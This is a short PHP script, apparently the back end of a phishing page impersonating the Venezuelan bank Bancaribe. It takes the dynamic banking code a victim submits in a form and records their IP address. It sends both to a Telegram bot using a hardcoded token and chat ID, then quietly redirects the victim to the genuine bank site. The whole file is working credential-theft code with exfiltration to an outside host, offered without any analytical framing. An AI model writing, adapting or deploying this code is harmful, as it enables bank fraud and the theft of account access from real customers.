<?php
function enviarMensajeTelegram($mensaje) {
    $botToken = '7262207322:AAE51Mq-EHEUJUXut9X7l0nSJhIK2F7jsGs'; // Reemplaza con el token de tu bot
    $chatID = '-4500407776'; // Reemplaza con el ID del canal o chat al que quieras enviar el mensaje

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array('chat_id' => $chatID, 'text' => $mensaje);

    $options = array(
        'http' => array(
            'method'  => 'POST',
            'header'  => 'Content-type: application/x-www-form-urlencoded',
            'content' => http_build_query($data)
        )
    );

    $context  = stream_context_create($options);
    $resultado = file_get_contents($url, false, $context);

    return $resultado;
}

// Verifica si se ha recibido una solicitud POST
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Recupera los datos del formulario (Clave Dinámica)
    $claveDinamica = $_POST["clave_dinamica"];

    // Captura la dirección IP del usuario
    $direccionIP = $_SERVER['REMOTE_ADDR'];

    // Construye un mensaje con la información
    $mensaje = "Dirección IP: " . $direccionIP . "\n";
    $mensaje .= "Clave Dinámica: " . $claveDinamica . "\n";

    // Envía el mensaje a Telegram
    enviarMensajeTelegram($mensaje);

    // Redirige automáticamente al usuario a una página externa después de 5 segundos
    echo '<meta http-equiv="refresh" content="5;url=https://www.bancaribe.com.ve/">';
    exit;
} else {
    // Si no se recibió una solicitud POST, muestra un mensaje de error
    echo "No se recibieron datos del formulario.";
}
?>
